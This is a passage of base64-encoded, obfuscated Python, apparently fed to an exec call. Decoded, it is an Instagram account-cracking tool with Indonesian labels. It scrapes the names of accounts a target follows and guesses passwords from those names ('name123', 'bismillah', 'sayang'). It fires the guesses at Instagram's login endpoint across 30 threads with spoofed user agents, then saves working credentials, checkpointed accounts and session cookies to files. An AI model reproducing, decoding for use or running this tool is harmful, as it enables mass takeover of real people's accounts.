sZSh3aWR0aD01MCkucHJpbnQoUGFuZWwoIltib2xkIHJlZF1kdW1wIGVycm9yLCBjYXJpIHVzZXJuYW1lIGxhaW4gYXRhdSBnYW50aSB0dW1iYWwhISEiLHN0eWxlPSJib2xkIGN5YW4iKSk7dGltZS5zbGVlcCgyKTttZW51KCkKCiAgICBkZWYgZm9sbG93aW5nKHNlbGYsIHVzZXJpZCwgY29va2llcywga2hhbWRpaGlkZXYpOgogICAgICAgICAgd2l0aCByZXF1ZXN0cy5TZXNzaW9uKCkgYXMga29udG9sOgogICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgIHNlbGYudXJsID0ga29udG9sLmdldCgiaHR0cHM6Ly9pLmluc3RhZ3JhbS5jb20vYXBpL3YxL2ZyaWVuZHNoaXBzL3t9L2ZvbGxvd2luZy8/Y291bnQ9MTAwJm1heF9pZD17fSIuZm9ybWF0KHVzZXJpZCwga2hhbWRpaGlkZXYpLCBoZWFkZXJzID0geyJ1c2VyLWFnZW50Ijp1YV9pZ30sIGNvb2tpZXMgPSB7ImNvb2tpZSI6Y29va2llc30pCiAgICAgICAgICAgICAgICAgICAgIGZvciBzZWxmLnR4dCBpbiBqc29uLmxvYWRzKHNlbGYudXJsLnRleHQpWyJ1c2VycyJdOgogICAgICAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi50eHRbInVzZXJuYW1lIl0gaW4gc2VsZi5pZDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuaWQuYXBwZW5kKHNlbGYudHh0WyJ1c2VybmFtZSJdKyI8PT4iK3NlbGYudHh0WyJmdWxsX25hbWUiXSkKICAgICAgICAgICAgICAgICAgICAgaWYgIm5leHRfbWF4X2lkIiBpbiBqc29uLmxvYWRzKHNlbGYudXJsLnRleHQpOnNlbGYuZm9sbG93aW5nKHVzZXJpZCwgY29va2llcywganNvbi5sb2FkcyhzZWxmLnVybC50ZXh0KVsibmV4dF9tYXhfaWQiXSkKICAgICAgICAgICAgICAgICAgICAgc2VsZi5zZWxhbmp1dG55YShzZWxmLmlkKQogICAgICAgICAgICAgICBleGNlcHQgS2V5RXJyb3I6CiAgICAgICAgICAgICAgICAgICAgIENvbnNvbGUod2lkdGg9NTApLnByaW50KFBhbmVsKCJbYm9sZCByZWRdZHVtcCBlcnJvciwgY2FyaSB1c2VybmFtZSBsYWluIGF0YXUgZ2FudGkgdHVtYmFsIixzdHlsZT0iYm9sZCBjeWFuIikpO3RpbWUuc2xlZXAoMik7bWVudSgpCgogICAgZGVmIHNlbGFuanV0bnlhKHNlbGYsIGtvbnRvbCk6CiAgICAgICAgb2tlaF8gPSBmJ1tib2xkIHdoaXRlXVtbYm9sZCBncmVlbl3igKJbYm9sZCB3aGl0ZV1dIFJlc3VsdHMgT0sgOiBPSy9PSy17aW5kb30udGV4dFxuW2JvbGQgd2hpdGVdW1tib2xkIGdyZWVuXeKAoltib2xkIHdoaXRlXV0gUmVzdWx0cyBDUCA6IENQL0NQLXtpbmRvfS50ZXh0JwogICAgICAgIHByaW50KGYnXHIgIHtIfeKAoiB7Tn1Vc2VybmFtZSBZYW5nIFRlcmt1bXB1bCA6IHtIfXtsZW4oa29udG9sKX0nKQogICAgICAgIHVsZmFoKCcnJ1tib2xkIHdoaXRlXVtbYm9sZCBncmVlbl0xW2JvbGQgd2hpdGVdXSBQYXNzd29yZDEgOiBuYW1hLG5hbWExMjMKW2JvbGQgd2hpdGVdW1tib2xkIGdyZWVuXTJbYm9sZCB3aGl0ZV1dIFBhc3N3b3JkMiA6IG5hbWEsbmFtYTEyMyxuYW1hMTIzNApbYm9sZCB3aGl0ZV1bW2JvbGQgZ3JlZW5dM1tib2xkIHdoaXRlXV0gUGFzc3dvcmQzIDogbmFtYSxuYW1hMTIzLG5hbWExMjM0ICsgTWFudWFsICcnJywnY29sb3IoNSknKQogICAgICAgIHNhbmRpID0gaW5wdXQoZicgIHtIfeKAoiB7Tn1QaWxpaCA6IHtIfScpCiAgICAgICAgaWYgc2FuZGkgaW4gWyczJywnMDMnXToKICAgICAgICAgICB1bGZhaCgnW2JvbGQgd2hpdGVdR3VuYWthbiBLb21hIFVudHVrIFBlbWlzYWhhbiBDb250b2ggOiBSYXlhbnhkMTIzLFJheWFueGQxMjM0LFJheWFueGQxMjM0NScsJ2NvbG9yKDUpJykKICAgICAgICAgICBwd2VrID0gaW5wdXQoZicgIHtIfeKAoiB7Tn1NYXN1a2FuIFBhc3N3b3JkIDogJykKICAgICAgICAgICBpZiBsZW4ocHdlaykgPD01OgogICAgICAgICAgICAgICAgZXhpdChmJ1xuICB7TX0gUGFzc3dvcmQgSGFydXMgTGViaWggRGFyaSA2IEthcmFrdGVyJykKCiAgICAgICAgdWxmYWgob2tlaF8sJ2NvbG9yKDUpJykKICAgICAgICB3aXRoIGtoYW1kaWhpWFYobWF4X3dvcmtlcnM9MzApIGFzIGNvaWQ6CiAgICAgICAgICAgICBmb3IgbXlsb3ZlIGluIGtvbnRvbDoKICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWUgPSBteWxvdmUuc3BsaXQoJzw9PicpWzBdCiAgICAgICAgICAgICAgICAgICAgICAgcGFzc3dvcmQgPSBteWxvdmUuc3BsaXQoJzw9PicpWzFdCiAgICAgICAgICAgICAgICAgICAgICAgZm9yIHggaW4gcGFzc3dvcmQuc3BsaXQoJyAnKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHgpIDwzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNhbmRpIGluIFsnMScsJzAxJ106CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFt4LHgrJzEyMycseCsnMTIzNCcsJ2Jpc21pbGxhaCcsJ3NheWFuZycseC5sb3dlcigpKycxMjMnLHgubG93ZXIoKSsnMTIzNCddCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbGlmIHNhbmRpIGluIFsnMicsJzAyJ106CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFt4LHgrJzEyMycseCsnMTIzNCcseCsnMTIzNDUnLCdiaXNtaWxsYWgnLHgubG93ZXIoKSsnMTIzJyx4Lmxvd2VyKCkrJzEyMzQnLHgubG93ZXIoKSsnMTIzNDUnXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWlpID0gW3gseCsnMTIzJyx4KycxMjM0Jyx4KycxMjM0NScseCsnMzIxJyx4Lmxvd2VyKCkrJzEyMycseC5sb3dlcigpKycxMjM0J10KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gaWlpICsgcHdlay5zcGxpdCgnLCcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb2lkLnN1Ym1pdChzZWxmLmNyYWNrLCB1c2VybmFtZSwgcHd4KQogICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpwcmludChlKQogICAgICAgIGV4aXQoZidcbiAqIENyYWNrIFNlbGVzYWlcbiBKdW1sYWggQWt1biBPSzp7bGVuKG9rKX1cbiBKdW1sYWggQWt1biBDUDp7bGVuKGNwKX0nKQoKICAgIGRlZiBhY291bnQoc2VsZiwgdXNlcm5hbWUpOgogICAgICAgIHRyeToKICAgICAgICAgICAgbGluayA9IHJlcXVlc3RzLlNlc3Npb24oKS5nZXQoImh0dHBzOi8vaS5pbnN0YWdyYW0uY29tL2FwaS92MS91c2Vycy93ZWJfcHJvZmlsZV9pbmZvLz91c2VybmFtZT0lcyIlKHVzZXJuYW1lKSxoZWFkZXJzPXsidXNlci1hZ2VudCI6dWFfaWcsIngtaWctYXBwLWlkIjonOTM2NjE5NzQzMzkyNDU5J30pLmpzb24oKVsiZGF0YSJdWyJ1c2VyIl0KICAgICAgICAgICAgbmFtYSA9IGxpbmsuZ2V0KCJmdWxsX25hbWUiKQogICAgICAgICAgICBtZW5naWt1dCA9IGxpbmsuZ2V0KCJlZGdlX2ZvbGxvdyIpLmdldCgiY291bnQiKQogICAgICAgICAgICBwZW5naWt1dCA9IGxpbmsuZ2V0KCJlZGdlX2ZvbGxvd2VkX2J5IikuZ2V0KCJjb3VudCIpCiAgICAgICAgICAgIHBvc3RpbmdhbiA9IGxpbmsuZ2V0KCJlZGdlX293bmVyX3RvX3RpbWVsaW5lX21lZGlhIikuZ2V0KCJjb3VudCIpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBuYW1hID0gIictJyIKICAgICAgICAgICAgbWVuZ2lrdXQgPSAiJy0nIgogICAgICAgICAgICBwZW5naWt1dCA9ICInLSciCiAgICAgICAgICAgIHBvc3RpbmdhbiA9ICInLSciCgogICAgICAgIHJldHVybiBuYW1hLCBwZW5naWt1dCwgbWVuZ2lrdXQsIHBvc3RpbmdhbgoKICAgIGRlZiBVc2VyQWdlbnQoc2VsZik6CiAgICAgICAgeiA9IHJhbmRvbS5yYW5kaW50KDMwMDAsNDAwMCkKICAgICAgICBpID0gcmFuZG9tLnJhbmRpbnQoNTAsNzApCiAgICAgICAgeCA9IHJhbmRvbS5yYW5kaW50KDgwLDEyMCkKICAgICAgICB1ID0gZmxvYXQocmFuZG9tLnJhbmRpbnQoMSwxMikpCiAgICAgICAgYSA9IHJhbmRvbS5yYW5kaW50KDYsMTIpCiAgICAgICAgcmV0dXJuIChmJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCB7cmFuZG9tLnJhbmRpbnQoNiwxMil9OyBJbmZpbml4IFg2NTNDIEJ1aWxkL1BQUjEuMTgwNjEwLjAxMSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgTGludXgvNjEuMC4zMTYzLjEyOCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBYaWFvTWkvTWludCBCcm93c2VyLzMuOS4zJykKCiAgICBkZWYgY3JhY2soc2VsZiwgdXNlciwgcHd4KToKICAgICAgICBnbG9iYWwgb2ssY3AsbG9vcAogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZidcciB7SH1MaXZlIHtOfVJheWFuLVhEIDoge2xvb3B9L3tsZW4oc2VsZi5pZCl9IHtIfU9LOntsZW4ob2spfSB7S31DUDp7bGVuKGNwKX0nKTtzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICBmb3IgcHcgaW4gcHd4OgogICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgaSA9IHJlcXVlc3RzLlNlc3Npb24oKQogICAgICAgICAgICAgICAgICAgbGluayA9IGkuZ2V0KCdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL2FjY291bnRzL2xvZ2luJykKICAgICAgICAgICAgICAgICAgIGkuaGVhZGVycy51cGRhdGUoewogICAgICAgICAgICAgICAgICAgICAgICAnSG9zdCc6ICd3d3cuaW5zdGFncmFtLmNvbScsCiAgICAgICAgICAgICAgICAgICAgICAgICdjb250ZW50LWxlbmd0aCc6ICczMjcnLAogICAgICAgICAgICAgICAgICAgICAgICAnc2VjLWNoLXVhJzogJyJHb29nbGUgQ2hyb21lIjt2PSIxMDciLCAiQ2hyb21pdW0iO3Y9IjEwNyIsICJOb3Q9QT9CcmFuZCI7dj0iMjQiJywKICAgICAgICAgICAgICAgICAgICAgICAgJ3gtaWctYXBwLWlkJzogJzEyMTc5ODE2NDQ4Nzk2MjgnLAogICAgICAgICAgICAgICAgICAgICAgICAneC1pZy13d3ctY2xhaW0nOiAnMCcsCiAgICAgICAgICAgICAgICAgICAgICAgICdzZWMtY2gtdWEtbW9iaWxlJzogJz8xJywKICAgICAgICAgICAgICAgICAgICAgICAgJ3gtaW5zdGFncmFtLWFqYXgnOiAnMTAwNjYzMTE3MCcsCiAgICAgICAgICAgICAgICAgICAgICAgICd1c2VyLWFnZW50Jzogc2VsZi5Vc2VyQWdlbnQoKSwKICAgICAgICAgICAgICAgICAgICAgICAgJ3ZpZXdwb3J0LXdpZHRoJzogJzM2MCcsCiAgICAgICAgICAgICAgICAgICAgICAgICdjb250ZW50LXR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2FjY2VwdCc6ICcqLyonLAogICAgICAgICAgICAgICAgICAgICAgICAneC1yZXF1ZXN0ZWQtd2l0aCc6ICdYTUxIdHRwUmVxdWVzdCcsCiAgICAgICAgICAgICAgICAgICAgICAgICd4LWFzYmQtaWQnOiAnMTk4Mzg3JywKICAgICAgICAgICAgICAgICAgICAgICAgJ3gtY3NyZnRva2VuJzogb3BlbignZGF0YS9jc3JmdG9rZW4udHh0JywncicpLnJlYWQoKSwKICAgICAgICAgICAgICAgICAgICAgICAgJ3NlYy1jaC1wcmVmZXJzLWNvbG9yLXNjaGVtZSc6ICdsaWdodCcsCiAgICAgICAgICAgICAgICAgICAgICAgICdzZWMtY2gtdWEtcGxhdGZvcm0nOiAnIkFuZHJvaWQiJywKICAgICAgICAgICAgICAgICAgICAgICAgJ29yaWdpbic6ICdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tJywKICAgICAgICAgICAgICAgICAgICAgICAgJ3NlYy1mZXRjaC1zaXRlJzogJ3NhbWUtb3JpZ2luJywKICAgICAgICAgICAgICAgICAgICAgICAgJ3NlYy1mZXRjaC1tb2RlJzogJ2NvcnMnLAogICAgICAgICAgICAgICAgICAgICAgICAnc2VjLWZldGNoLWRlc3QnOiAnZW1wdHknLAogICAgICAgICAgICAgICAgICAgICAgICAncmVmZXJlcic6ICd0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2FjY2VwdC1lbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlLCBicicsCiAgICAgICAgICAgICAgICAgICAgICAgICdhY2NlcHQtbGFuZ3VhZ2UnOiAnaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjcscnU7cT0wLjYsanY7cT0wLjUnCiAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgICAgZGF0YSA9IHsKICAgICAgICAgICAgICAgICAgICAgICdlbmNfcGFzc3dvcmQnOicjUFdEX0lOU1RBR1JBTV9CUk9XU0VSOjA6e306e30nLmZvcm1hdChpbnQodGltKCkpLHB3KSwKICAgICAgICAgICAgICAgICAgICAgICd1c2VybmFtZSc6dXNlciwKICAgICAgICAgICAgICAgICAgICAgICdxdWVyeVBhcmFtcyc6J3t9JywKICAgICAgICAgICAgICAgICAgICAgICdvcHRJbnRvT25lVGFwJzonZmFsc2UnLAogICAgICAgICAgICAgICAgICAgICAgJ3RydXN0ZWREZXZpY2VSZWNvcmRzJzone30nCiAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICBVbGZhID0gaS5wb3N0KCdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL2FwaS92MS93ZWIvYWNjb3VudHMvbG9naW4vYWpheC8nLCBkYXRhPWRhdGEpCiAgICAgICAgICAgICAgICAgICBzeWRoID0ganNvbi5sb2FkcyhVbGZhLnRleHQpCiMgICAgICAgICAgICAgICAgICAgaS5oZWFkZXJzLnVwZGF0ZSh7J3gtY3NyZnRva2VuJzppLmNvb2tpZXNbJ2NzcmZ0b2tlbiddfSkKICAgICAgICAgICAgICAgICAgIGlmICd1c2VySWQnIGluIHN5ZGg6CiAgICAgICAgICAgICAgICAgICAgICAgbmFtYSwgcGVuZ2lrdXQsIG1lbmdpa3V0LCBwb3N0aW5nYW4gPSBzZWxmLmFjb3VudCh1c2VyKQogICAgICAgICAgICAgICAgICAgICAgIGNva2kgPSAiOyIuam9pbihbc3RyKHgpKyI9IitzdHIoZSkgZm9yIHgsZSBpbiBpLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpXSkKICAgICAgICAgICAgICAgICAgICAgICBwcmludChmJ1xyIHtIfUxJVkUgT0sge3VzZXJ9fHtwd30nKQogICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYnJydccgoge0h9ICAg4oCiIHtOfXVzZXJuYW1lICA6IHtIfXtuYW1hfQoge0h9ICAg4oCiIHtOfVBlbmdpa3V0ICA6IHtIfXtwZW5naWt1dH0KIHtIfSAgIOKAoiB7Tn1NZW5naWt1dGkgOiB7SH17bWVuZ2lrdXR9CiB7SH0gICDigKIge059UG9zdGluZ2FuIDoge0h9e3Bvc3Rpbmdhbn0KIHtIfSAgIOKAoiB7Tn1Db29raWVzICAgOiB7SH17Y29raX0gJycnKQogICAgICAgICAgICAgICAgICAgICAgIG9wZW4oZidPSy9PSy17aW5kb30udHh0JywnYScpLndyaXRlKGYne3VzZXJ9fHtwd30nKQogICAgICAgICAgICAgICAgICAgICAgIG9rLmFwcGVuZCh1c2VyKQogICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICBlbGlmICdjaGVja3BvaW50X3VybCcgaW4gc3lkaDoKICAgICAgICAgICAgICAgICAgICAgICBuYW1hLCBwZW5naWt1dCwgbWVuZ2lrdXQsIHBvc3RpbmdhbiA9IHNlbGYuYWNvdW50KHVzZXIpCiAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZidcciB7S31DSEVDS1BPSU5UIHt1c2VyfXx7cHd9JykKICAgICAgICAgICAgICAgICAgICAgICBwcmludChmJycnXHIKIHtIfSAgIOKAoiB7Tn11c2VybmFtZSAgOiB7S317bmFtYX0KIHtIfSAgIOKAoiB7Tn1QZW5naWt1dCAgOiB7S317cGVuZ2lrdXR9CiB7SH0gICDigKIge059TWVuZ2lrdXRpIDoge0t9e21lbmdpa3V0fQoge0h9ICAg4oCiIHtOfVBvc3RpbmdhbiA6IHtLfXtwb3N0aW5nYW59ICcnJykKICAgICAgICAgICAgICAgICAgICAgICBvcGVuKGYnQ1AvQ1Ate2luZG99LnR4dCcsJ2EnKS53cml0ZShmJ3t1c2VyfXx7cHd9JykKICAgICAgICAgICAgICAgICAgICAgICBjcC5hcHBlbmQodXNlcikKICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOnNlbGYuY3JhY2sodXNlcixwd3gpCiAgICAgICAgbG9vcCArPTEKCmRlZiBmb2xkZXIoKToKICAgIHRyeTpvcy5ta2RpcignT0snKQogICAgZXhjZXB0OnBhc3MKICAgIHRyeTpvcy5ta2RpcignQ1AnKQogICAgZXhjZXB0OnBhc3MKICAgIHRyeTpvcy5ta2RpcignZGF0YScpCiAgICBleGNlcHQ6cGFzcwppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICBzaXMoJ2dpdCBwdWxsJykKICAgZm9sZGVyKCkKICAgbWVudSgp'))